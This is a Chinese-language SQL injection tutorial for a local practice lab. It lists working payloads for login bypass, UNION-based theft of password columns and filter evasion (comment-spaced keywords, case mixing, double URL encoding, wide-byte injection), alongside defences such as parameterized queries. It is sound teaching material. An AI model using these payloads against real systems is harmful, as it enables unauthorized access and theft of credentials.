# 2. SQL 注入 (SQL Injection)

## 是什么？

SQL 注入是最经典的 Web 漏洞之一。当应用把**用户输入直接拼接到 SQL 语句**中时，攻击者可以注入恶意的 SQL 代码来操控数据库。

## 🧠 原理

```python
# 正常代码
username = request.form['username']
password = request.form['password']
sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

当用户输入 `admin` / `admin123`：

```sql
SELECT * FROM users WHERE username='admin' AND password='admin123'
```

当攻击者输入 `admin' OR '1'='1' --` / 任意：

```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='xxx'
                                    └──────────────┘            └─ 后面的被注释掉
                                    永真条件！返回第一行数据
```

## 🎯 靶场练习 1：登录绕过

你的任务：**不用密码，以 admin 身份登录**

打开 `http://127.0.0.1:5000/sqli/login`

### 尝试这些 Payload：

```sql
admin'--
' OR 1=1--
admin' OR '1'='1
' OR '1'='1' --
" OR 1=1--
') OR 1=1--
```

### 原理：注释掉密码验证部分

```sql
-- 原本
SELECT * FROM users WHERE username='admin' AND password='123456'

-- 注入后（-- 是 SQL 注释）
SELECT * FROM users WHERE username='admin'--' AND password='123456'
                                              └── 这部分变成注释，不执行！
```

## 🎯 靶场练习 2：UNION 联合查询窃取数据

你的任务：**获取 users 表的所有用户名和密码**

打开 `http://127.0.0.1:5000/sqli/search`

### 步骤 1：判断列数

```sql
' ORDER BY 1--    (正常)
' ORDER BY 2--    (正常)
' ORDER BY 3--    (正常)
' ORDER BY 4--    (报错！→ 说明有 3 列)
```

### 步骤 2：UNION 注入

```sql
' UNION SELECT 1, username, password FROM users--
```

结果：搜索结果 + 所有用户的密码！

## 🗂️ SQL 注入分类

| 类型 | 说明 |
|------|------|
| **联合查询注入** | 用 UNION 合并查询结果 |
| **布尔盲注** | 根据页面返回的真/假判断 |
| **时间盲注** | 根据响应时间判断（`SLEEP(5)`） |
| **报错注入** | 利用 SQL 错误信息泄露数据 |
| **堆叠查询** | 执行多条 SQL（`; DROP TABLE`） |
| **二次注入** | 数据先存入，后续被拼接到其他 SQL |

## 🛡️ 防御方法

### ❌ 错误做法
```python
sql = f"SELECT * FROM users WHERE username='{username}'"
```

### ✅ 正确做法

**1. 参数化查询（首选）**
```python
cursor.execute("SELECT * FROM users WHERE username=?", (username,))
```

**2. ORM 框架**
```python
User.objects.filter(username=username)
```

**3. 输入校验 + 白名单**
```python
# 用户名只能包含字母数字
if not username.isalnum():
    raise ValueError("非法用户名")
```

**4. 最小权限原则**
- 应用数据库用户只给 SELECT、INSERT 等必要权限
- 禁止 DROP、ALTER 等危险操作

**5. WAF（Web 应用防火墙）** 作为额外防线

## 📚 经典案例

- **2008 年 Heartland Payment Systems** — SQL 注入导致 1.3 亿张信用卡泄露
- **Sony Pictures 2011** — 百万用户信息被盗
- **TalkTalk 2015** — 15 万用户数据泄露

## 🧪 进阶技巧

```sql
-- 绕过空格过滤
SELECT/**/password/**/FROM/**/users

-- 大小写绕过
SeLeCt * FrOm users

-- 双重 URL 编码
%2527 （等于 '）

-- 宽字节注入（GBK 编码）
%df' （吃掉转义符 \）
```

---

**下一步**：[XSS 跨站脚本攻击](03-xss.md)
